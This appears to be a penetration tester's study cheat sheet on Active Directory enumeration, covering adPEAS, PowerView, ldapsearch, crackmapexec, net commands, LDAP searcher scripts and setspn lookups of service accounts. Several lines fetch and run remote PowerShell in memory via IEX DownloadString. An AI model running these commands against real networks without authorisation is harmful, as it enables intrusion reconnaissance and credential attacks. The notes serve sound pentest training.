# Enumeration

{% embed url="https://en.rattibha.com/thread/1553334438557126657" %}

{% embed url="https://www.thehacker.recipes/" %}

{% embed url="https://tools.thehacker.recipes/" %}

{% embed url="https://github.com/61106960/adPEAS" %}

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/adPEAS.ps1');Invoke-adPEAS -Domain 'domain.com' -Server 'dc01.domain.com'
<strong>or
</strong>Invoke-WebRequest -Uri "http://192.168.45.5/adPEAS.ps1" -OutFile "C:\tmp\adPEAS.ps1"
<strong>Import-Module .\adPEAS.ps1
</strong>Invoke-adPEAS -Domain 'domain.com' -Server 'dc01.domain.com'

#with creds
$SecPassword = ConvertTo-SecureString 'Pass' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain\johndoe', $SecPassword)
Invoke-adPEAS -Domain 'domain.com' -Cred $Cred

Invoke-adPEAS -Domain 'domain.com' -Server 'dc1.domain.com' -Username 'domain\johndoe' -Password 'pass' -Force
</code></pre>

#### ldap search

{% code overflow="wrap" %}
```
ldapsearch -x -H LDAP://192.168.222.122 -D '' -w '' -b "DC=hutch,DC=offsec" > ldapuser
```
{% endcode %}

#### CME enum network

```
crackmapexec smb 192.168.0.0/24
```

#### PowerView

{% embed url="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview" %}

{% embed url="https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet" %}

{% code overflow="wrap" %}
```powershell

IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/PowerView.ps1')

Invoke-WebRequest -Uri "http://192.168.45.5/PowerView.ps1" -OutFile "C:\tmp\PowerView.ps1"
Import-Module .\PowerView.ps1

Get-NetDomain #Domain info
Get-DomainController #DC info
Get-NetUser -SPN #Kerberoastable users
Get-NetUser -Domain msp.local | Where-Object {$_.servicePrincipalName}

Get-NetComputer

Get-NetUser
Get-DomainGroupMember "Domain Admins" -Recurse

Get-NetLoggedon -ComputerName <servername> #Get net logon users at the moment in a computer (need admins rights on target)
Get-NetSession -ComputerName <servername> #Get active sessions on the host
```
{% endcode %}

### Tradition

```
net user
net user /domain
net user xxx /domain
net group /domain (pdf p.632 for enum groups)
net group "domain admins" /domain
net localgroup "administrators"

whoami /group
net user /domain
net localgroup /domain
```

### Current domain

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

PdcRoleOwner : DC01.corp.com (primary dc)
Name : corp.com
```

```
nslookup
set type=all
_ldap._tcp.dc._msdcs.sandbox.local
```

```
nmap -sC
```

```
net user /domain (as admin)
```

### Build LDAP provider path

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$SearchString

LDAP://DC01.corp.com/DC=corp,DC=com
```

### Search all AD users / specific user

{% code overflow="wrap" %}
```powershell
#$domainObj = dc01.corp.com # if as a local user instead of domain user
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host "------------------------"
}
```
{% endcode %}

```
$Searcher.filter="name=Jeff_Admin"
```

### SPN

Find `name` for service account name and `serviceprincipalname` to generate ticket

may save as `.ps1`

{% code overflow="wrap" %}
```powershell
# as a local user
$domainObj = dc01.corp.com
# or as domain user > [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"
$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="serviceprincipalname=*corp*"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
Write-Host "------------------------"
}
```
{% endcode %}

#### alternative

```
setspn -T * -F -Q */* 
setspn -T domain.local -F -Q */* 

setspn -T $env:computername -F -Q */*  (if no domain name)
```

```
nslookup corpweb.corp.comer
```

